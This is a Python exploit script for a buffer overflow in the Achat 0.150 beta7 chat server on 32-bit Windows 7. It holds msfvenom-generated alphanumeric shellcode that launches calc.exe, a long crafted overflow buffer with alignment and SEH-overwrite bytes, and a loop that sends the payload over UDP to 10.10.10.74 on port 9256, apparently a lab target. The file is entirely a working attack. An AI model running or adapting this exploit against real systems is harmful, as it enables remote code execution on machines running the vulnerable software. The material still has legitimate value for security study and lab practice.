#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes
buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x6b\x4c\x4b\x38\x53\x52"
buf += "\x79\x70\x39\x70\x6b\x50\x31\x50\x61\x79\x67\x75\x70"
buf += "\x31\x69\x30\x50\x64\x32\x6b\x50\x50\x4e\x50\x42\x6b"
buf += "\x52\x32\x6a\x6c\x34\x4b\x6f\x62\x4c\x54\x32\x6b\x44"
buf += "\x32\x4f\x38\x6a\x6f\x45\x67\x70\x4a\x6c\x66\x6c\x71"
buf += "\x69\x6f\x76\x4c\x4d\x6c\x51\x51\x43\x4c\x6b\x52\x4c"
buf += "\x6c\x6f\x30\x37\x51\x68\x4f\x5a\x6d\x6b\x51\x46\x67"
buf += "\x6b\x32\x79\x62\x31\x42\x30\x57\x54\x4b\x42\x32\x6c"
buf += "\x50\x62\x6b\x6e\x6a\x6d\x6c\x42\x6b\x4e\x6c\x4a\x71"
buf += "\x71\x68\x59\x53\x71\x38\x39\x71\x48\x51\x32\x31\x62"
buf += "\x6b\x4e\x79\x4f\x30\x69\x71\x69\x43\x34\x4b\x4d\x79"
buf += "\x4d\x48\x69\x53\x6e\x5a\x31\x39\x54\x4b\x6d\x64\x72"
buf += "\x6b\x7a\x61\x66\x76\x4d\x61\x6b\x4f\x34\x6c\x67\x51"
buf += "\x78\x4f\x6c\x4d\x59\x71\x59\x37\x6d\x68\x47\x70\x61"
buf += "\x65\x6c\x36\x6c\x43\x61\x6d\x4b\x48\x4d\x6b\x51\x6d"
buf += "\x4c\x64\x73\x45\x67\x74\x6e\x78\x74\x4b\x72\x38\x4c"
buf += "\x64\x6b\x51\x77\x63\x4f\x76\x74\x4b\x6c\x4c\x4e\x6b"
buf += "\x42\x6b\x4f\x68\x4d\x4c\x59\x71\x49\x43\x72\x6b\x49"
buf += "\x74\x34\x4b\x49\x71\x46\x70\x33\x59\x61\x34\x6b\x74"
buf += "\x6b\x74\x51\x4b\x51\x4b\x61\x51\x72\x39\x6e\x7a\x32"
buf += "\x31\x49\x6f\x39\x50\x31\x4f\x6f\x6f\x4f\x6a\x34\x4b"
buf += "\x5a\x72\x7a\x4b\x52\x6d\x31\x4d\x72\x48\x70\x33\x4c"
buf += "\x72\x6b\x50\x4d\x30\x42\x48\x30\x77\x72\x53\x6f\x42"
buf += "\x71\x4f\x62\x34\x32\x48\x4e\x6c\x44\x37\x6d\x56\x6c"
buf += "\x47\x4b\x4f\x47\x65\x54\x78\x36\x30\x4d\x31\x4d\x30"
buf += "\x79\x70\x4c\x69\x36\x64\x6e\x74\x70\x50\x42\x48\x6f"
buf += "\x39\x73\x50\x50\x6b\x4d\x30\x69\x6f\x57\x65\x4e\x70"
buf += "\x72\x30\x50\x50\x42\x30\x61\x30\x70\x50\x31\x30\x50"
buf += "\x50\x51\x58\x5a\x4a\x6c\x4f\x37\x6f\x37\x70\x4b\x4f"
buf += "\x79\x45\x66\x37\x42\x4a\x6c\x45\x51\x58\x59\x7a\x6c"
buf += "\x4a\x6c\x4e\x7a\x64\x32\x48\x49\x72\x59\x70\x6d\x34"
buf += "\x46\x72\x65\x39\x38\x66\x50\x6a\x4a\x70\x71\x46\x4e"
buf += "\x77\x61\x58\x36\x39\x64\x65\x33\x44\x6f\x71\x6b\x4f"
buf += "\x49\x45\x51\x75\x45\x70\x74\x34\x6c\x4c\x6b\x4f\x4e"
buf += "\x6e\x39\x78\x30\x75\x6a\x4c\x61\x58\x5a\x50\x67\x45"
buf += "\x75\x52\x6f\x66\x39\x6f\x7a\x35\x61\x58\x30\x63\x50"
buf += "\x6d\x4f\x74\x49\x70\x52\x69\x77\x73\x61\x47\x51\x47"
buf += "\x50\x57\x4e\x51\x48\x76\x6f\x7a\x6a\x72\x61\x49\x51"
buf += "\x46\x78\x62\x59\x6d\x70\x66\x55\x77\x31\x34\x6e\x44"
buf += "\x6d\x6c\x7a\x61\x6b\x51\x74\x4d\x30\x44\x6e\x44\x6c"
buf += "\x50\x79\x36\x6d\x30\x30\x44\x52\x34\x50\x50\x52\x36"
buf += "\x30\x56\x31\x46\x70\x46\x61\x46\x6e\x6e\x51\x46\x70"
buf += "\x56\x61\x43\x52\x36\x6f\x78\x34\x39\x46\x6c\x4f\x4f"
buf += "\x44\x46\x79\x6f\x66\x75\x43\x59\x77\x70\x30\x4e\x52"
buf += "\x36\x61\x36\x6b\x4f\x6c\x70\x62\x48\x6c\x48\x43\x57"
buf += "\x6d\x4d\x63\x30\x6b\x4f\x39\x45\x77\x4b\x68\x70\x57"
buf += "\x45\x75\x52\x31\x46\x52\x48\x34\x66\x62\x75\x45\x6d"
buf += "\x35\x4d\x59\x6f\x57\x65\x6f\x4c\x4a\x66\x31\x6c\x6c"
buf += "\x4a\x45\x30\x39\x6b\x59\x50\x63\x45\x6d\x35\x47\x4b"
buf += "\x6e\x67\x4d\x43\x62\x52\x70\x6f\x50\x6a\x4b\x50\x4e"
buf += "\x73\x79\x6f\x58\x55\x41\x41"
# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40" 
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()
